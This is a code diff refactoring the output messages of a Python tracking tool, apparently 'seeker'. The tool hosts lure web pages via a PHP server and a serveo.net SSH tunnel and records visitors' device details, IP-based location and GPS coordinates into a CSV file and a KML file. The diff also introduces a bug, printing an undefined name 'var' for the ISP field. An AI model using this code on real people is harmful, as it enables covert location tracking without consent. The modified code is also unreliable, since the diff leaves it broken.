@@ -6,15 +6,27 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
+def default(text):
+	return G + '[+]' + C + text + W
+
+def error_(text):
+	return R + '[-]' + C + text + W 
+
+
+def alert(text):
+	return R + '[!]' + C + text + W
+
+
 from shutil import which
 
-print(G + '[+]' + C + ' Checking Dependencies...' + W)
+print(default(' Checking Dependencies....'))
+
 pkgs = ['python3', 'pip3', 'php', 'ssh']
 inst = True
 for pkg in pkgs:
 	present = which(pkg)
 	if present == None:
-		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
+		print(error_(pkg + ' is not installed!'))
 		inst = False
 	else:
 		pass
@@ -62,7 +74,9 @@ def banner():
 	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
 
 def ver_check():
-	print(G + '[+]' + C + ' Checking for Updates.....', end='')
+	
+	print(default(' Checking for updates....'), end='')
+	
 	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
 	try:
 		ver_rqst = requests.get(ver_url)
@@ -84,14 +98,16 @@ def tunnel_select():
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+		print(default(' Skipping Serveo, start your own tunnel service manually...') + '\n')
+		
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
 
 def template_select():
 	global site, info, result
-	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
+	print(default(' Select a Template:') + '\n')
+	
 	
 	with open('template/templates.json', 'r') as templ:
 		templ_info = templ.read()
@@ -107,10 +123,12 @@ def template_select():
 	try:
 		site = templ_json['templates'][selected]['dir_name']
 	except IndexError:
-		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		print('\n'+ error_(' Invaid Input!') + '\n')
+		
 		sys.exit()
 	
-	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
+	print('\n' + default(' Loading {} Template...'.format(templ_json['templates'][selected]['name'])))
+
 	
 	module = templ_json['templates'][selected]['module']
 	if module == True:
@@ -126,8 +144,8 @@ def template_select():
 def serveo():
 	global subdom
 	flag = False
-
-	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+	print(default(' Checking Serveo Status....'),end='')
+	
 
 	try:
 		time.sleep(1)
@@ -141,8 +159,7 @@ def serveo():
 	except requests.ConnectionError:
 		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
 		exit()
-			
-	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	print(default(' Getting Serveo URl....') + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
@@ -159,7 +176,7 @@ def serveo():
 						if 'HTTP' in elem:
 							elem = elem.split(' ')
 							url = elem[4].strip()
-							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
+							print(default(' URL:') + url + '\n')
 							flag = True
 						else:
 							pass
@@ -171,8 +188,9 @@ def serveo():
 		time.sleep(2)
 
 def server():
-	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
-	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
+	print('\n' + default(' Port:') + str(port))
+	print('\n' + default(' Starting PHP Server....'),end='')
+
 	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
@@ -193,7 +211,8 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
+			print('\n' + default(' Waiting for user interaction') + '\n')
+			
 			printed = True
 		if size > 0:
 			main()
@@ -230,16 +249,18 @@ def main():
 				row.append(var_browser)
 				row.append(var_ip)
 
-				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
-				print(G + '[+]' + C + ' OS         : ' + W + var_os)
-				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
-				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
-				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
-				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
-				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
-				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
-				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
-				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
+				
+
+				print(default(' Device Information :') + '\n')
+				print(default(' OS         : ') + var_os)
+				print(default(' Platform   : ') + var_platform)
+				print(default(' CPU Cores  : ') + var_cores)
+				print(default(' RAM        : ') + var_ram)
+				print(default(' GPU Vendor : ') + var_vendor)
+				print(default(' GPU        : ') + var_render)
+				print(default(' Resolution : ') + var_res)
+				print(default(' Browser    : ') + var_browser)
+				print(default(' Public IP  : ') + var_ip)
 
 				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
 				sc = rqst.status_code
@@ -261,12 +282,14 @@ def main():
 					row.append(var_org)
 					row.append(var_isp)
 
-					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
-					print(G + '[+]' + C + ' Country    : ' + W + var_country)
-					print(G + '[+]' + C + ' Region     : ' + W + var_region)
-					print(G + '[+]' + C + ' City       : ' + W + var_city)
-					print(G + '[+]' + C + ' Org        : ' + W + var_org)
-					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
+					print(default(' Continent : ') + var_continent)
+					print(default(' Country   : ') + var_country)
+					print(default(' Region    : ') + var_region)
+					print(default(' City      : ')+ var_city)
+					print(default(' Org       : ')+ var_org)
+					print(default(' ISP       : ')+ var)
+
+
 	except ValueError:
 		pass
 	
@@ -304,19 +327,22 @@ def main():
 				row.append(var_dir)
 				row.append(var_spd)
 
-				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
-				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
-				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
-				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
-				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
-				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
-				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
+				print('\n' + default(' Location Information : ') + '\n')
+				print(default(' Latitude  : ') + var_lat)
+				print(default(' Longitude : ') + var_lon)
+				print(default(' Accuracy  : ') + var_acc)
+				print(default(' Altitude  : ') + var_alt)
+				print(default(' Direction : ') + var_dir)
+				print(default(' Speed     : ') + var_spd)
+
+
 	except ValueError:
 		error = file
-		print ('\n' + R + '[-] ' + W + error)
+		print('\n' + error_(error))
 		repeat()
 
-	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
+	print('\n' + default(' Google Maps.................: ') + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
+	
 	
 	if kml_fname is not None:
 		kmlout(var_lat, var_lon)
@@ -334,14 +360,17 @@ def kmlout(var_lat, var_lon):
 	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
 		kml_gen.write(kml_sample_data)
 
-	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
+
+	print(default(' KML File Generated..........: ') + os.getcwd() + '/{}.kml'.format(kml_fname))
+
 
 def csvout():
 	global row
 	with open('db/results.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
-	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
+	print(default(' New Entry Added in Database.: ') + os.getcwd() + '/db/results.csv')
+	
 
 def clear():
 	global result
@@ -369,5 +398,5 @@ try:
 	main()
 
 except KeyboardInterrupt:
-	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
+	print('\n' + alert(' Keyboard Interrupt.'))
 	Quit()
